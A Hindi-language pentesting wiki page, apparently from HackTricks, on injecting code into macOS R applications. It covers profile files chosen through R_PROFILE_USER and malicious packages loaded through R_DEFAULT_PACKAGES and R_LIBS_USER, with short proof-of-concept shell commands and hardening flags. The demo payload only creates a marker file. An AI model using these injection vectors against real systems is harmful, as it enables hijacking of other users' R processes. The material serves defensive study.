# macOS R Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `R_PROFILE_USER` / `R_PROFILE`

स्टार्टअप के समय R, R कोड वाली site और user profile फ़ाइलों को source करता है। `R_PROFILE` site profile को चुनता है और `R_PROFILE_USER` user profile को चुनता है, जिससे inherited environment किसी भी lookup को attacker-readable फ़ाइल पर redirect कर सकता है।<sup>[[1]](#references)</sup>
```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```
`--no-init-file` user profile को skip करता है, `--no-site-file` site profile को skip करता है, और `--vanilla` दोनों protections को शामिल करता है। R पहले `R_ENVIRON` और `R_ENVIRON_USER` द्वारा चुनी गई environment files को process करता है, लेकिन वे files केवल variables set करती हैं; profile variables direct arbitrary-code primitive हैं।

## `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` and library paths

R startup के दौरान `R_DEFAULT_PACKAGES` में दिए गए comma-separated packages को attach करता है। `Rscript`, `R_SCRIPT_DEFAULT_PACKAGES` को precedence देता है। इनमें से किसी variable को `R_LIBS`, `R_LIBS_USER`, या `R_LIBS_SITE` के साथ मिलाने पर R attacker-controlled installed package को find और load कर सकता है; उसका `.onLoad` या `.onAttach` hook अपने-आप execute हो जाता है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```
इसके लिए केवल एक loose `.R` file नहीं, बल्कि संरचनात्मक रूप से मान्य installed R package आवश्यक है। `--vanilla` direct inherited variables को clear नहीं करता, इसलिए trusted wrapper को profile files को disable करने के साथ-साथ default-package और library-path variables को भी unset या replace करना चाहिए।

## References

- [1] [R Session के आरंभ पर Initialization](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [2] [R Installation and Administration: Add-on packages](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
{{#include ../../../banners/hacktricks-training.md}}
